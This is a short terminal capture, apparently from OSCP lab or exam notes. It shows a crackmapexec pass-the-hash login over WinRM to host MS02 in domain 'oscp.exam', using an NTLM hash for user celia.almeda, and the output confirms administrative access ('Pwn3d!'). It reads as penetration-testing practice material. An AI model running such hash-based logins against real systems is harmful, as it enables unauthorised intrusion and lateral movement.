└─$ crackmapexec winrm 10.10.193.142 -u celia.almeda -H 'e728ecbadfb02f51ce8eed753f3ff3fd'

SMB         10.10.193.142   5985   MS02             \[*\] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)

HTTP        10.10.193.142   5985   MS02             \[*\] http://10.10.193.142:5985/wsman

/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.

arc4 = algorithms.ARC4(self._key)

WINRM       10.10.193.142   5985   MS02             \[+\] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)

![[└─$ crackmapexec winrm 10.10.193.142 -u celia.almeda -H 'e728ecbadfb02f51ce8eed753f3ff3fd' image.png]]